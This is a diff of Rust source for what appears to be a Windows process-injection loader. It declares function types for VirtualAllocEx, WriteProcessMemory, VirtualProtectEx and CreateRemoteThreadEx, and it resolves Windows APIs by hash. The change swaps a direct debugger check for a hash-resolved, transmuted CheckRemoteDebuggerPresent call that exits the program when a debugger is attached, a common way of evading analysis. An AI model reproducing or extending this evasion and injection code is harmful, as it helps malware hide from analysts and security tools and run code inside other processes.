@@ -29,7 +29,7 @@ type TOpenProcess = unsafe extern "system" fn(
 type TCheckRemoteDebuggerPresent = unsafe extern "system" fn(
     hprocess: HANDLE,
     pbdebuggerpresent: *mut BOOL
-) -> Result<()>;
+) -> ();
 
 type TIsDebuggerPresent = unsafe extern "system" fn() -> BOOL;
 
@@ -43,7 +43,7 @@ type TVirtualAllocEx = unsafe extern "system" fn(
 
 type TCloseHandle = unsafe extern "system" fn(
     hobject: HANDLE
-) -> Result<()>;
+) -> ();
 
 type TWriteProcessMemory = unsafe extern "system" fn(
     hprocess: HANDLE,
@@ -51,7 +51,7 @@ type TWriteProcessMemory = unsafe extern "system" fn(
     lpbuffer: *const c_void,
     nsize: usize,
     lpnumberofbyteswritten: Option<*mut usize>
-) -> Result<()>;
+) -> ();
 
 type TVirtualProtectEx = unsafe extern "system" fn(
     hprocess: HANDLE,
@@ -59,7 +59,7 @@ type TVirtualProtectEx = unsafe extern "system" fn(
     dwsize: usize,
     flnewprotect: PAGE_PROTECTION_FLAGS,
     lpfloldprotect: *mut PAGE_PROTECTION_FLAGS
-) -> Result<()>;
+) -> ();
 
 type TCreateRemoteThreadEx = unsafe extern "system" fn(
     hprocess: HANDLE,
@@ -70,7 +70,7 @@ type TCreateRemoteThreadEx = unsafe extern "system" fn(
     dwcreationflags: u32,
     lpattributelist: LPPROC_THREAD_ATTRIBUTE_LIST,
     lpthreadid: Option<*mut u32>
-) -> Result<HANDLE>;
+) -> HANDLE;
 
 type TWaitForSingleObject = unsafe extern "system" fn(
     hhandle: HANDLE,
@@ -81,7 +81,7 @@ type TVirtualFree = unsafe extern "system" fn(
     lpaddress: *mut c_void,
     dwsize: usize,
     dwfreetype: VIRTUAL_FREE_TYPE
-) -> Result<()>;
+) -> ();
    
 fn getHashFromFunc(funcName: &str) -> u32 {
     // let stringLength: usize = funcName.len();
@@ -190,7 +190,7 @@ fn main() {
 
     //getFuncAddressByHash("kernel32", 0xf92f7b);
 
-    //println!("{:#x}", getHashFromFunc("CheckRemoteDebuggerPresent"));
+    println!("{:#x}", getHashFromFunc("CheckRemoteDebuggerPresent"));
 
     let pid = process::id();
 
@@ -202,7 +202,9 @@ fn main() {
 
         let mut debugger_present: BOOL = BOOL(0);
 
-        if CheckRemoteDebuggerPresent(hprocess, &mut debugger_present as *mut BOOL).is_ok() && debugger_present.as_bool() {
+        let XCheckRemoteDebuggerPresent: TCheckRemoteDebuggerPresent = mem::transmute(getFuncAddressByHash("kernel32.dll", 0x8dd921) as *const u32);
+        let _ = XCheckRemoteDebuggerPresent(hprocess, &mut debugger_present as *mut BOOL);
+        if debugger_present.as_bool() {
             process::exit(-1);
         }
 
